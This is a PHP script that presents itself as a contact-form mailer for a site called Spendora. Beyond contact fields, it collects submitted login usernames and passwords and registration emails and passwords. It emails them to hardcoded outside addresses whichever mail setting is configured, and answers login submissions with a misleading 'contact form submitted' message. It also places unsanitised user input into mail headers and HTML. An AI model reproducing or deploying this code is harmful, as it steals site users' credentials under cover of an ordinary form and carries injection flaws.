<?php



$string = file_get_contents("config.json");

$option = json_decode($string);



define("MAIL_HOST", $option->MAIL_HOST);

$name = "";
$email= "";
$comment = "";
$message = "";
$reg_password = "";
$reg_email = "";
$username = "";
$password = "";
$all_message = "";

define("MAIL_TITLE", $option->MAIL_TITLE);

if (isset($_POST['name'])) {
    $name = $_POST['name'];
    $all_message = "<h3>Name: " . $name . "</h3>";
}

if (isset($_POST['email'])) {
    $email = $_POST['email'];
    $all_message .= "<h3>Email: </h3><p>" . $email . "</p>";
}
if (isset($_POST['comment'])) {
    $comment = $_POST['comment'];
    $all_message .= "<h3>Comments: " . $comment . "</h3>";
}

if (isset($_POST['message'])) {
    $message = $_POST['message'];
    $all_message .= "<h3>Message: </h3><p>" . $message . "</p>";
}

if (isset($_POST['password'])) {
    $password = $_POST['password'];
    $all_message .= "<h3>Password: </h3><p>" . $password . "</p>";
}

if (isset($_POST['reg_password'])) {
    $password = $_POST['reg_password'];
    $all_message .= "<h3>Register Password: </h3><p>" . $password . "</p>";
}

if (isset($_POST['reg_email'])) {
    $reg_email = $_POST['reg_email'];
    $all_message .= "<h3>Register Password: </h3><p>" . $reg_email . "</p>";
}

if (isset($_POST['username'])) {
    $username = $_POST['username'];
    $all_message .= "<h3>User Name: </h3><p>" . $username . "</p>";
}

if( isset($_POST['name']) && isset($_POST['email']) && isset($_POST['comment']) || isset($_POST['name']) && isset($_POST['email']) && isset($_POST['message']) || isset($_POST['username']) && isset($_POST['password']) || isset($_POST['reg_email']) && isset($_POST['reg_password']) ){


    if (MAIL_HOST != null) {

        $to = 'xacise9183@yektara.com';

    } else {

        $to = "gajoje7449@sdysofa.com";

    }

    $from = $email;

    if (MAIL_TITLE != null) {

        $subject = MAIL_TITLE;

    } else {

        $subject = '[Spendora] Contact Form Message';

    }

    $headers = "From: $from\n";

    $headers .= "MIME-Version: 1.0\n";

    $headers .= "Content-type: text/html; charset=iso-8859-1\n";

    if( mail($to, $subject, $all_message, $headers) ) {

        $serialized_data = '{"type":"success", "message":"Contact form successfully submitted. Thank you, I will get back to you soon!"}';

        echo $serialized_data;

    } else {

        $serialized_data = '{"type":"danger", "message":"Contact form failed. Please send again later!"}';

        echo $serialized_data;

    }
}

